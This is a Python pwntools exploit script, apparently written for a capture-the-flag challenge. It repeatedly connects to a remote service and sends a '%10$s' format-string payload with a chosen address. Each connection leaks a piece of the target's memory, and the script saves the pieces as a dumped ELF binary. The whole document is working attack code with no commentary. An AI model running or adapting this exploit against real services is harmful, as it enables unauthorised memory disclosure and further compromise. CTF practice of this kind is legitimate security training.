from pwn import *

context.log_level = "warning"

HOST, PORT = "nc1.ctfplus.cn", 36942
BASE = 0x400000
SIZE = 0x20000

def leak(offset):
    io = remote(HOST, PORT)
    io.recvuntil(b"magic echo...\n")
    payload = b"%10$s".ljust(16, b"A") + p64(BASE + offset)
    io.send(payload)
    data = io.recv(timeout=3)
    io.close()
    return data

dumped = b""
off = 0
while off < SIZE:
    data = leak(off)
    dumped += data + b"\x00"
    off += len(data) + 1
    print(f"[+] {off:#x} / {SIZE:#x}  last_chunk={len(data)}")

with open("dumped_elf", "wb") as f:
    f.write(dumped)
log.info("saved to 'dumped_elf'")